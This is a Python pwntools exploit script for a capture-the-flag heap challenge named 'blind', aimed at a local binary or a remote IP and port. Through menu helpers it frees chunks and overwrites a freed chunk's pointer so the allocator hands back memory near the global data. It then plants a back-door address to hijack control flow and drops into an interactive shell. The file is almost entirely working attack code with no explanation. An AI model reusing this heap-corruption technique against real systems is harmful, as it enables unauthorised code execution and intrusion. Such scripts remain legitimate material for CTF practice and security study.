from pwn import *
local = 1
context.log_level = 'debug'
if local:
    p = process('./blind')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    gdb.attach(p)
else:
    p = remote('106.75.20.44' , 9999)
    libc = ELF('./libc.so.6')

def new(index , content):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.sendline(content)
    p.recvuntil('Done!')

def change(index , content):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.sendline(content)
    p.recvuntil('Done!')

def release(index):
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Done!')


back_door = 0x4008E3
fake_heap = 0x601fe5
new(0 , 'A'*0x8 )         #00
new(1 , p64(0x4008e3)*12 )         #01
new(2 , 'C'*0x8 )         #02
release(0)
release(2)
change(2, p64(0x601ff5 ))
new(3 , '\x01'*0x8 )         #00
new(4 , '\x00'*0x13+p64(0x6020f0)+p64(0x601f90))         #00


p.interactive()
